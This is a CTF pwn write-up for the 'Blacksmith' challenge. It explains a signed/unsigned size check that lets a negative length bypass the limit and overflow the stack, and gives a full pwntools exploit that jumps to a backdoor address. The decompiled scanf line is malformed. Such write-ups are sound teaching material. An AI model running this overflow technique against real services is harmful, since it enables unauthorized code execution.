## Blacksmith

- 题目描述：

  > 世界需要你去拯救！不过在那之前，先让铁匠为你打造一把称手的兵器吧。
  >
  > By *Mercurio*
  
 - 题目附件：[blacksmith](https://cdn.jsdelivr.net/gh/SignorMercurio/MetasequoiaCTF@master/Pwn/Blacksmith/blacksmith)

 - 考察点：无符号整数

 - 难度：简单

 - 初始分值：100

 - 最终分值：85

 - 完成人数：5

### 程序分析

忘记密码的函数如下：

```c
int forget(){
  size_t nbytes; // [rsp+8h] [rbp-48h]
  char buf; // [rsp+10h] [rbp-40h]

  nbytes = 0LL;
  puts("Forging...");
  puts("What's the size of this sword's name?");
  scanf("%d";
  if ( nbytes > 63 )
    return puts("The name is too long!");
  puts("And the name is?");
  read(0, &buf, nbytes);
  return puts("Here you are, the new sword!\n");
}
```

其中`read`的第三个参数是无符号整数，而`nbytes`是有符号整数，所以输入负数可以绕过长度检查，然后读大量数据造成栈溢出，执行程序中的后门

### exp

```python
#!/usr/bin/python
#coding=utf-8
#__author__:TaQini

from pwn import *

local_file  = './blacksmith'
local_libc  = '/lib/x86_64-linux-gnu/libc.so.6'
remote_libc = local_libc # '../libc.so.6'

is_local = False
is_remote = False

if len(sys.argv) == 1:
    is_local = True
    p = process(local_file)
    libc = ELF(local_libc)
elif len(sys.argv) > 1:
    is_remote = True
    if len(sys.argv) == 3:
        host = sys.argv[1]
        port = sys.argv[2]
    else:
        host, port = sys.argv[1].split(':')
    p = remote(host, port)
    libc = ELF(remote_libc)

elf = ELF(local_file)

context.log_level = 'debug'
context.arch = elf.arch

se      = lambda data               :p.send(data) 
sa      = lambda delim,data         :p.sendafter(delim, data)
sl      = lambda data               :p.sendline(data)
sla     = lambda delim,data         :p.sendlineafter(delim, data)
sea     = lambda delim,data         :p.sendafter(delim, data)
rc      = lambda numb=4096          :p.recv(numb)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
uu32    = lambda data               :u32(data.ljust(4, '\0'))
uu64    = lambda data               :u64(data.ljust(8, '\0'))
info_addr = lambda tag, addr        :p.info(tag + ': {:#x}'.format(addr))

def debug(cmd=''):
    if is_local: gdb.attach(p,cmd)

# info
# gadget
prdi = 0x0000000000400b23 # pop rdi ; ret

# elf, libc

# rop1
offset = 72
payload = 'A'*offset
payload += p64(0x4007D6)

sla('Your choice > ','1')
sla(' name?\n','-1')
ru('And the name is?\n')
debug()
sl(payload)

# debug()
# info_addr('tag',addr)
# log.warning('--------------')

p.interactive()
```

